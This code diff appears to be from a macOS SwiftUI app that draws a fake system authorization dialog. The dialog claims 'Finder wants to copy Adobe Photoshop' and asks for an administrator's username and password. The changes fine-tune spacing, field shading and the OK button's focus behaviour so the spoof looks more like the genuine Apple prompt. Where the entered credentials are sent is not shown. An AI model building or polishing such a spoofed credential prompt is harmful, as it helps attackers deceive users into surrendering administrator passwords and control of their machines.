@@ -128,10 +128,7 @@ struct FinderPadlockIcon: View {
 }
 
 private let appleSystemBlue = Color(red: 0.0, green: 0.478, blue: 1.0)
-
-// Unfocused 0.15, focused 0.24 — subtle darkening on click
-private let unfocusedAlpha: Double = 0.15
-private let focusedAlpha: Double = 0.24
+private let fieldAlpha: Double = 0.18
 
 struct SecondaryButtonStyle: ButtonStyle {
     func makeBody(configuration: Configuration) -> some View {
@@ -140,22 +137,27 @@ struct SecondaryButtonStyle: ButtonStyle {
             .foregroundColor(.primary)
             .frame(maxWidth: .infinity)
             .frame(height: 24)
-            .background(Capsule(style: .continuous).fill(Color.black.opacity(0.13)))
+            .background(Capsule(style: .continuous).fill(Color.black.opacity(0.14)))
             .contentShape(Capsule(style: .continuous))
             .opacity(configuration.isPressed ? 0.70 : 1.0)
     }
 }
 
 struct PrimaryButtonStyle: ButtonStyle {
+    let isActive: Bool
     func makeBody(configuration: Configuration) -> some View {
         configuration.label
             .font(.system(size: 13))
-            .foregroundColor(.white)
+            .foregroundColor(isActive ? .white : .primary)
             .frame(maxWidth: .infinity)
             .frame(height: 24)
-            .background(Capsule(style: .continuous).fill(appleSystemBlue))
+            .background(
+                Capsule(style: .continuous)
+                    .fill(isActive ? appleSystemBlue : Color.black.opacity(0.14))
+            )
             .contentShape(Capsule(style: .continuous))
             .opacity(configuration.isPressed ? 0.80 : 1.0)
+            .animation(.easeInOut(duration: 0.15), value: isActive)
     }
 }
 
@@ -163,36 +165,37 @@ struct ContentView: View {
     @State private var username = ""
     @State private var password = ""
     @State private var isLoading = false
+    @State private var windowIsKey = true
     @FocusState private var focusedField: Field?
     enum Field { case username, password }
 
     var body: some View {
         VStack(alignment: .leading, spacing: 0) {
             FinderPadlockIcon()
-                .padding(.bottom, 14)
+                .padding(.bottom, 8)
 
             Text("Finder")
                 .font(.system(size: 15, weight: .bold))
                 .foregroundColor(.primary)
-                .padding(.bottom, 14)
+                .padding(.bottom, 10)
 
             Text("Finder wants to copy \u{201C}Adobe Photoshop\u{201D}.")
                 .font(.system(size: 13))
                 .foregroundColor(.primary)
-                .padding(.bottom, 6)
+                .padding(.bottom, 5)
 
             Text("Enter an administrator\u{2019}s name and password to allow this.")
                 .font(.system(size: 13))
                 .foregroundColor(.primary)
                 .lineSpacing(2)
                 .fixedSize(horizontal: false, vertical: true)
-                .padding(.bottom, 14)
+                .padding(.bottom, 10)
 
             fieldContainer(text: $username, placeholder: "Username", secure: false, field: .username)
-                .padding(.bottom, 8)
+                .padding(.bottom, 6)
 
             fieldContainer(text: $password, placeholder: "Password", secure: true, field: .password)
-                .padding(.bottom, 14)
+                .padding(.bottom, 10)
 
             HStack(spacing: 12) {
                 Button("Cancel") { cancel() }
@@ -200,7 +203,7 @@ struct ContentView: View {
                     .keyboardShortcut(.cancelAction)
                     .disabled(isLoading)
                 Button("OK") { submit() }
-                    .buttonStyle(PrimaryButtonStyle())
+                    .buttonStyle(PrimaryButtonStyle(isActive: windowIsKey))
                     .keyboardShortcut(.defaultAction)
                     .disabled(isLoading)
             }
@@ -213,7 +216,7 @@ struct ContentView: View {
                 }
             }
         }
-        .padding(16)
+        .padding(14)
         .frame(width: 260)
         .background(VisualEffectView(material: .popover))
         .clipShape(RoundedRectangle(cornerRadius: 20, style: .continuous))
@@ -222,7 +225,6 @@ struct ContentView: View {
                 .stroke(Color.white.opacity(0.10), lineWidth: 0.5)
         )
         .compositingGroup()
-        // 4-layer graduated shadow — no visible rectangle edge
         .shadow(color: .black.opacity(0.10), radius: 2, x: 0, y: 1)
         .shadow(color: .black.opacity(0.055), radius: 10, x: 0, y: 4)
         .shadow(color: .black.opacity(0.028), radius: 24, x: 0, y: 10)
@@ -230,7 +232,12 @@ struct ContentView: View {
         .padding(.top, 14)
         .padding(.horizontal, 20)
         .padding(.bottom, 28)
-        .animation(.easeInOut(duration: 0.20), value: focusedField)
+        .onReceive(NotificationCenter.default.publisher(for: NSWindow.didBecomeKeyNotification)) { _ in
+            windowIsKey = true
+        }
+        .onReceive(NotificationCenter.default.publisher(for: NSWindow.didResignKeyNotification)) { _ in
+            windowIsKey = false
+        }
         .onAppear {
             DispatchQueue.main.asyncAfter(deadline: .now() + 0.15) {
                 focusedField = .username
@@ -240,6 +247,7 @@ struct ContentView: View {
 
     @ViewBuilder
     private func fieldContainer(text: Binding<String>, placeholder: String, secure: Bool, field: Field) -> some View {
+        let isFocused = focusedField == field
         ZStack(alignment: .leading) {
             if text.wrappedValue.isEmpty {
                 Text(placeholder)
@@ -265,8 +273,7 @@ struct ContentView: View {
         }
         .background(
             RoundedRectangle(cornerRadius: 6, style: .continuous)
-                .fill(Color.black.opacity(focusedAlpha))
-                .opacity(focusedField == field ? 1.0 : (unfocusedAlpha / focusedAlpha))
+                .fill(Color.black.opacity(fieldAlpha))
         )
         .overlay(
             ZStack {
@@ -276,7 +283,8 @@ struct ContentView: View {
                 RoundedRectangle(cornerRadius: 6, style: .continuous)
                     .stroke(appleSystemBlue.opacity(0.65), lineWidth: 1.4)
             }
-            .opacity(focusedField == field ? 1.0 : 0.0)
+            .opacity(isFocused ? 1.0 : 0.0)
+            .animation(.easeInOut(duration: 0.20), value: isFocused)
         )
     }
 
